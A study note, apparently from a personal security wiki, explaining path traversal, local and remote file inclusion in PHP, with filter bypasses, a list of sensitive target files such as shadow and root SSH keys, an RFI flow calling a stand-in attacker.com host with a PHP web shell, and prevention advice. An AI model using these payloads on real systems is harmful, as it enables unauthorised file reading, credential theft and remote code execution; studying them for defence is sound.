---
title: "LFI & RFI"
created: 2026-03-11
updated: 2026-11-12
type: technique
tags: [lfi, rfi, technique, web, path-traversal]
---

## What Is It

File inclusion vulnerabilities happen when user input controls which file a server-side function loads. The root cause is always the same — unsanitized input passed into a file-handling function.

Three related but distinct vulnerabilities:

| Type | Function | Behavior |
|------|----------|----------|
| **Path Traversal** | `file_get_contents()` | Reads a file, returns raw contents |
| **LFI** | `include()` / `require()` | Reads a file **and executes any code inside it** |
| **RFI** | `include()` with URL | Fetches a remote file and executes it |

The critical difference: path traversal = information disclosure. LFI = potential code execution. RFI = guaranteed code execution.

## Path Traversal

The `../` sequence moves up one directory. Chain enough of them to escape the web root and reach any file the web server process can read.

```
http://target/get.php?file=../../../../etc/passwd
```

The server resolves: `/var/www/app/CVs/../../../../etc/passwd` → `/etc/passwd`

On Windows, use backslashes or forward slashes:
```
http://target/get.php?file=../../../../windows/win.ini
```

## LFI — Local File Inclusion

PHP functions: `include`, `require`, `include_once`, `require_once`. Also appears in ASP, JSP, Node.js, Python.

### Scenario 1: No Directory Prefix

```php
include($_GET["lang"]);
```

No restrictions — supply any absolute path:
```
http://target/index.php?lang=/etc/passwd
```

### Scenario 2: Directory Prefix

```php
include("languages/" . $_GET['lang']);
```

Traverse out of the prepended directory:
```
http://target/index.php?lang=../../../../etc/passwd
```

Resolves to `languages/../../../../etc/passwd` → `/etc/passwd`

**Tip:** submit garbage input (e.g., `?lang=AAAA`) to trigger an error that reveals the prepended directory and the full application path on disk. That tells you exactly how many `../` you need.

## LFI Filter Bypasses

### Null Byte (`%00`)

When the app appends an extension (`.php`):

```php
include("languages/" . $_GET['lang'] . ".php");
```

The server looks for `/etc/passwd.php` — doesn't exist. The null byte terminates the string before the extension:

```
?lang=../../../../etc/passwd%00
```

**Only works on PHP < 5.3.4.** Patched in modern PHP.

### Keyword Filtering Bypass

If the app blocks exact strings like `/etc/passwd`, append `/.` (current directory reference):

```
?lang=/etc/passwd/.
?lang=/etc/passwd%00
```

The filter doesn't match, but the filesystem resolves it to the same file.

### Double Traversal (Strip Bypass)

If the app strips `../` from input in a single pass:

```
Input:  ....//....//....//etc/passwd
Strip:  removes ../ from each ....// → leaves ../
Result: ../../../etc/passwd
```

The inner `../` gets removed, but the remaining characters form a valid `../`. Works because the filter only runs once — it doesn't re-check after stripping.

### Forced Directory Prefix

If the app requires input to start with a specific directory:

```
?lang=languages/../../../../../etc/passwd
```

Starts with `languages/` (passes the check), then immediately traverses out of it.

## Common Target Files

| Location | Why It's Useful |
|----------|----------------|
| `/etc/passwd` | Lists all users — confirms the vuln works |
| `/etc/shadow` | Password hashes (needs elevated permissions) |
| `/etc/issue` | OS identification |
| `/proc/version` | Kernel version |
| `/etc/profile` | System-wide environment variables |
| `/root/.bash_history` | Root's command history |
| `/root/.ssh/id_rsa` | Root's private SSH key — instant shell |
| `/var/log/apache2/access.log` | Apache access log — useful for [[Log Poisoning]] |
| `/var/mail/root` | Root's emails |
| `C:\boot.ini` | Windows boot config (BIOS systems) |
| `C:\windows\win.ini` | Windows system config |

## RFI — Remote File Inclusion

Instead of including a local file, include a file from a server you control. The target fetches it and **executes it**.

### Requirements

PHP config `allow_url_fopen` (and sometimes `allow_url_include`) must be enabled. Often on by default.

### Attack Flow

1. Host a payload on your server (e.g., `cmd.txt` containing PHP code)
2. Inject the URL into the vulnerable parameter:
   ```
   ?lang=http://attacker.com/cmd.txt
   ```
3. Target server fetches the file via HTTP
4. Target server executes the PHP code inside it

**For RCE**, host a web shell or use `system()`:
```php
<?php system($_GET['cmd']); ?>
```

Then: `?lang=http://attacker.com/shell.txt&cmd=whoami`

### Why `.txt` not `.php`?

If you name it `.php`, **your** server executes it before sending it. Name it `.txt` so your server sends the raw PHP code, and the **target** server executes it.

## Testing Methodology

1. **Find entry points** — URL params, POST data, cookies, headers — anything that might control a file path
2. **Observe normal behavior** — submit valid input, note the response
3. **Submit garbage** — trigger errors that reveal directory structure, functions used, extensions appended
4. **Test traversal** — `../`, absolute paths, special characters
5. **Identify filters** — is `../` stripped? Is a prefix forced? Is an extension appended?
6. **Bypass filters** — null byte, double traversal, forced prefix tricks
7. **Escalate** — from reading files to code execution via [[Log Poisoning]], RFI, or PHP wrappers

## Prevention

| Measure | What It Blocks |
|---------|---------------|
| **Allowlist of permitted files** | Everything — map input to a fixed set of known paths, never use raw input |
| **Disable `allow_url_fopen` / `allow_url_include`** | RFI entirely |
| **Disable error messages in production** | Info leakage (directory paths, function names) |
| **Keep PHP updated** | Old bypasses like null byte (patched in 5.3.4) |
| **WAF** | Automated scanning, common traversal payloads |

The allowlist approach is the real fix:
```php
$allowed = ['en' => 'languages/EN.php', 'ar' => 'languages/AR.php'];
$lang = $_GET['lang'] ?? 'en';
if (array_key_exists($lang, $allowed)) {
    include($allowed[$lang]);
}
```

User input never touches the file path — it's just a lookup key.

## Related

- [[Log Poisoning]] — LFI to RCE by injecting PHP into log files, then including the log
- [[SSRF]] — related server-side request technique
- [[Command Injection]] — another path to RCE from user input
- [[Filtering]] — general filter bypass techniques
